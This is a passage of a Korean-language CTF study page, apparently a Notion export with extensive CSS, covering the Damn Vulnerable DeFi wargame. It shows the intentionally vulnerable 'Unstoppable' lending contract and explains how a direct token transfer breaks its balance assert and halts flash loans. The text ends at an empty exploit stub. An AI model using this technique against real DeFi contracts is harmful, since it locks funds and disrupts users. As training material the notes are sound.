@@ -1,0 +1,930 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Damm Vulnerable Defi</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="a5f78d73-99be-4045-b5b0-62b7ebb276ad" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🎋</span></div><h1 class="page-title">Damm Vulnerable Defi</h1></header><div class="page-body"><p id="8648992f-297a-4465-ad9b-1aed9dfed922" class="">생각보다 재밌는 것 같으나 익숙치 않아 어려움. 코어팀에는 합류하고 싶어 여기저기 솔루션을 참고하여 추석 연휴에 겨우겨우 풀어나감..(그마저도 다 못함). 내공 키운 후, 망각 곡선 도달할 때 다시 풀어보기!!</p><h1 id="d50418eb-b00f-45c0-ba0a-395f45667f70" class=""><details open=""><summary>How to write a good Write-up</summary></details></h1><div class="indented"><figure id="7da5a6ba-ff62-4ebd-92ad-c1a11a2a32cc"><a href="https://pequalsnp-team.github.io/cheatsheet/writing-good-writeup" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Cheatsheet - How to write a good Write-up</div><div class="bookmark-description">I&#x27;ve participated to lot of CTFs and every time one ends I always read good, bad and &quot;shitty&quot; Write-up. When you are writing a Write-up, keep in mind that you are not writing it for Fame and Glory (maybe also for this), but you should write it for other users that want to learn and explore new way to think and most important, you should write it for yourself!!</div></div><div class="bookmark-href"><img src="https://pequalsnp-team.github.io/imgs/favicon.png" class="icon bookmark-icon"/>https://pequalsnp-team.github.io/cheatsheet/writing-good-writeup</div></div></a></figure><h1 id="95d1d801-e146-4078-a7b9-640a13fb68c1" class="">Introduction</h1><p id="afb9a6b0-a27e-4b07-82db-9a2a64d12561" class="">I’ve participated to lot of CTFs and every time one ends I always read <strong>good, bad and “shitty” Write-up.</strong></p><p id="9cda5601-b98a-42d1-8808-f9b042f73a4b" class="">When you are writing a Write-up, keep in mind that you are not writing it for Fame and Glory (maybe also for this), but <em>you should write it for other users that want to learn and explore new way to think and most important,</em><em><strong>you should write it for yourself!!</strong></em> .</p><p id="66638b6e-4f9b-4785-92ec-ba80e32e6d8b" class="">Sometimes I find challenges in CTF that I’ve already completed some time ago, or at work I see problems that I’ve already solved during a CTF and going back reading those Write-up made me cringe every time.</p><p id="283f3e60-ec08-4a6e-a926-02d5be2efbb2" class="">So <strong>I think it will be useful to write some guidelines for us (and you!) to follow when writing a write-up.</strong></p><h1 id="f60d38e3-10fe-45ae-aedc-b85a03a5cd74" class="">Step 0 - Required Information</h1><p id="93d76fc0-7e2d-4053-9a4b-c38860886348" class="">If you are writing a Write-up for a CTF, there are some information that you <em><strong>NEED</strong></em> to include. These information are:</p><ul id="084d8e73-ff85-4d0b-92be-fd05e3374f57" class="bulleted-list"><li style="list-style-type:disc"><strong>CTF name</strong></li></ul><ul id="ab5fa252-3a5f-4bef-8cce-70959fdce730" class="bulleted-list"><li style="list-style-type:disc"><strong>Challenge name</strong></li></ul><ul id="10c4ae74-1569-485a-abce-c004746074f2" class="bulleted-list"><li style="list-style-type:disc"><strong>Challenge description</strong></li></ul><ul id="d0ab6104-6121-4e83-bd8c-9218248fc59a" class="bulleted-list"><li style="list-style-type:disc"><strong>Challenge category</strong> =&gt; so users know the chall’s field</li></ul><ul id="1d5adeb2-ee5a-4697-af3e-bfde38081bd2" class="bulleted-list"><li style="list-style-type:disc"><strong>Challenge points</strong> =&gt; so users know the chall’s difficulty</li></ul><ul id="038ee93f-c6ef-4e82-acd0-43b77e985ee7" class="bulleted-list"><li style="list-style-type:disc"><em>CTF Year and Date</em> <strong>[OPTIONAL]</strong> =&gt; so users know if it’s outdated</li></ul><h1 id="8c863c87-57f8-4447-99c6-66527b1a427c" class="">Step 1 - Content</h1><p id="0a57d617-e8f7-4fd1-9c84-02bd75a48785" class=""><strong>When writing your content don’t be too greedy.</strong>I’ve seen some Write-up made up of a to-do list, some made of just Python/JS code with no comment whatsoever.</p><p id="82015ad6-329a-43aa-a9b5-81d0b40b2df1" class="">You have to explain the <em>exact sequence of thoughts</em> you went through to go from A to B.“I have <code>2</code>, I know that <code>2 + 2 = flag</code> so I made this script that computes <code>2 + 2</code> and I got the <code>flag</code>”Just don’t post your code without a description or some comments please.</p><p id="da3a58f1-4d7b-47da-a88d-b57ba7a9853c" class="">If you used an already existing script from somewhere else, be sure to back it up. Too many times people post links to their source code that after some time result broken.</p><p id="29c0e4cb-c0f3-4adf-a6ac-9fa679a6879d" class=""><strong>When writing your content don’t be too verbose.</strong>I mean, <em>you can</em>, but <strong>(at the top) insert an abstract/summary as a</strong> <em><strong>TL;DR</strong></em> <strong>(at least 50 words)</strong></p><p id="7faac9dc-41ea-425c-926d-ec2c31aa6004" class="">Don’t forget that if you include too many useless details you <em>will result boring</em>.So you can use some memes pic or write some jokes to keep the readers glued to the screen.</p><h1 id="f702feb9-86cc-4fd9-b3d0-ad9f87a05fce" class="">Step 2 - Extra Points</h1><p id="9e312528-ef79-46ec-82bb-f91f2c582d61" class="">You get <em>GOLDEN SHINING</em> Extra points if:</p><ul id="645642d0-e776-404b-829e-c355fdf2b7ab" class="bulleted-list"><li style="list-style-type:disc">You use <strong>bold</strong>, <em>italic</em> or <em><strong>both</strong></em> to enhance the Content’s key-point.</li></ul><ul id="c0488610-18bd-4192-8dda-4b0c4090aa0d" class="bulleted-list"><li style="list-style-type:disc">You add <strong>some screenshots</strong>.</li></ul><ul id="c045663b-51bd-45ed-a8e9-b2c3b5f5ed8e" class="bulleted-list"><li style="list-style-type:disc">You <strong>correctly format</strong> small code snippet, path, strings, etc.</li></ul><ul id="cdcb6e60-3b32-4aa7-b194-bd57e06ca2d4" class="bulleted-list"><li style="list-style-type:disc">Your write-up is <strong>reproducible</strong> (You must attach the challenge source-code, sometimes this can’t be done).</li></ul><ul id="dde766f0-8eed-443c-a001-7c2899c90a54" class="bulleted-list"><li style="list-style-type:disc">Your write-up is <strong>multilingual</strong> (<em><strong>English is a priority. At least for TL;DRs</strong></em>).</li></ul><figure id="14accf1e-33cb-41d1-a4fc-ec17abe22b52"><a href="https://stermi.medium.com/damn-vulnerable-defi-challenge-1-unstoppable-92bacdefafcc" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Damn Vulnerable DeFi Challenge #1 - Unstoppable</div><div class="bookmark-description">Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts. Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.</div></div><div class="bookmark-href"><img src="https://miro.medium.com/1*m-R_BkNf1Qjr1YbyOIJY2w.png" class="icon bookmark-icon"/>https://stermi.medium.com/damn-vulnerable-defi-challenge-1-unstoppable-92bacdefafcc</div></div><img src="https://miro.medium.com/max/270/1*W_RAPQ62h0em559zluJLdQ.png" class="bookmark-image"/></a></figure><figure id="08b55b6f-19fa-449d-b1ab-562a32db9fb4"><a href="https://ventral.digital/posts/2021/11/13/damn-vulnerable-defi-v2-part-1-setup-and-challenges-1-to-4" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Damn Vulnerable DeFi v2 - part #1: Setup and Challenges 1 to 4 * Ventral Digital</div><div class="bookmark-description">@tinchoabbate has recently released an updated version of the Damn Vulnerable DeFi, modernized with current Solidity version, tooling and more levels. After having recently completed OpenZeppelin&#x27;s Ethernaut and smarx&#x27;s Capture the Ether, it&#x27;s finally time to tackle, what I expect to be the most cha</div></div><div class="bookmark-href"><img src="https://images.squarespace-cdn.com/content/v1/5af1f3eb266c0730cff882ac/1574200427254-HZVVRIZJ4OV467KOJ5IE/favicon.ico?format=50w" class="icon bookmark-icon"/>https://ventral.digital/posts/2021/11/13/damn-vulnerable-defi-v2-part-1-setup-and-challenges-1-to-4</div></div><img src="http://static1.squarespace.com/static/5af1f3eb266c0730cff882ac/5c7abe57ec212d1ac3f11045/619079802afad123ec93b549/1644430431986/Screenshot_20211113_220804.png?format=1500w" class="bookmark-image"/></a></figure><figure id="d43b7ea8-7caa-4855-968c-e5f506714665"><a href="https://coinsbench.com/damn-vulnerable-defi-naive-receiver-level-2-solution-17d6a4763c7b" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Damn Vulnerable DeFi: &quot;Naive receiver&quot; (Level 2) - Solution</div><div class="bookmark-description">There&#x27;s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH. Drain all ETH funds from the user&#x27;s contract.</div></div><div class="bookmark-href"><img src="https://miro.medium.com/fit/c/256/256/1*ok5mZF1yuK8LO7NYQ4RGHg.jpeg" class="icon bookmark-icon"/>https://coinsbench.com/damn-vulnerable-defi-naive-receiver-level-2-solution-17d6a4763c7b</div></div><img src="https://miro.medium.com/max/1064/1*tvPX6GpCStNojTRpwZbcew.png" class="bookmark-image"/></a></figure></div><h1 id="f2da5107-f575-4f19-92a4-4e5c9a3b11a0" class="">Challenge #1 - Unstoppable</h1><h3 id="7067ce82-123c-48d9-8894-057eae9d0bba" class="">설명</h3><p id="5a30be5c-8895-4ea3-baac-5dbd68fd8310" class=""><em>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</em></p><p id="bf81aa38-509c-410b-8b79-34e2ab04bf05" class=""><em>If only there was a way to attack and stop the pool from offering flash loans …You start with 100 DVT tokens in balance.</em></p><pre id="e2028af3-04b4-4d4d-af64-26c4ff8ae658" class="code code-wrap"><code>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
+import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;
+
+interface IReceiver {
+    function receiveTokens(address tokenAddress, uint256 amount) external;
+}
+
+/**
+ * @title UnstoppableLender
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract UnstoppableLender is ReentrancyGuard {
+    IERC20 public immutable damnValuableToken;
+    uint256 public poolBalance;
+
+    constructor(address tokenAddress) {
+        require(tokenAddress != address(0), &quot;Token address cannot be zero&quot;);
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function depositTokens(uint256 amount) external nonReentrant {
+        require(amount &gt; 0, &quot;Must deposit at least one token&quot;);
+        // Transfer token from sender. Sender must have first approved them.
+        damnValuableToken.transferFrom(msg.sender, address(this), amount);
+        poolBalance = poolBalance + amount;
+    }
+
+    function flashLoan(uint256 borrowAmount) external nonReentrant {
+        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);
+
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+
+        // Ensured by the protocol via the `depositTokens` function
+        assert(poolBalance == balanceBefore);
+
+        damnValuableToken.transfer(msg.sender, borrowAmount);
+
+        IReceiver(msg.sender).receiveTokens(
+            address(damnValuableToken),
+            borrowAmount
+        );
+
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(
+            balanceAfter &gt;= balanceBefore,
+            &quot;Flash loan hasn&#x27;t been paid back&quot;
+        );
+    }
+}</code></pre><h3 id="951ee662-d0a3-4171-8975-660a70117ca6" class="">목표</h3><p id="8099d9e0-d262-4fb7-866d-e0f79f22fe55" class="">flashloan의 기능을 마비 시키는 것이 목적</p><p id="49dbd916-93d1-495a-ab1b-081a73d895ac" class="">test code 상 flashloan으로 10 토큰을 빌리는데 실패하면 성공</p><h3 id="7f48d311-f3e3-4c59-a194-c1016911d832" class="">분석</h3><p id="597948e7-d55f-4fae-999a-dcbc09d6ddb7" class="">flashloan함수는 borrowAmount 0을 체크하지 않음.</p><p id="c4f3529d-f774-4464-8472-f31410a867ca" class="">poolBalance는 state variable로 deposit 함수로 업데이트.</p><h3 id="b80f8318-c36a-4c7c-b830-2c356a0261d9" class="">공격</h3><p id="8e960c7b-5dd8-4b1d-bdb9-d1c4b9842ec8" class="">별도의 컨트랙트를 작성하지 않고 컨트랙트의 state를 변경.</p><p id="fee5a941-0f5d-4ed7-a9ea-86a4f8b33d39" class="">require나 assert의 조건을 체크</p><p id="23910381-3905-4f2c-b1bf-eadddc61b83b" class="">transfer 이행 전에 <code>assert(poolBalance == balanceBefore);</code> 를 확인. </p><p id="324cbcbe-60bd-4ae0-9a1e-ac8f221cc4c5" class="">balanceBefore는 함수 내에서 가져오지만 poolBalance는 depositTokens()에서 업데이트 된 것을 사용. transfer를 별도로 test 스크립트에서 이행하여 poolBalance 정보가 달라지게 함. </p><p id="1044873f-f955-4d8d-8e83-8e672c1837e9" class="">위 <code>assert(poolBalance == balanceBefore);</code>조건에 위배되어 플래시론 수행 불가.</p><pre id="3c84144d-e1cd-445b-86fe-22ea839fa1f9" class="code code-wrap"><code>it(&quot;Exploit&quot;, async function () {
+    /** CODE YOUR EXPLOIT HERE */
